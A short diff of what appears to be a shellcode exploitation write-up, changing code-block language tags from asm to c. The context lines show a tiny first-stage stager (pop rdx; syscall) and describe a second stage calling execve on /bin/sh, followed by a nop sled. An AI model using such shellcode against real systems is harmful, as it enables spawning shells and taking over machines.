@@ -6,7 +6,7 @@ The idea is to run a multi-stage shellcode, where the first stage is a small she
 
 ## First Stage (3 bytes)
 
-```asm
+```c
 pop rdx
 syscall
 ```
@@ -20,7 +20,7 @@ syscall
 
 Main idea: `execve(RDI -> "/bin/sh", RSI = argv -> NULL, RDX = envp -> NULL)`
 
-```asm
+```c
 nop
 nop
 nop
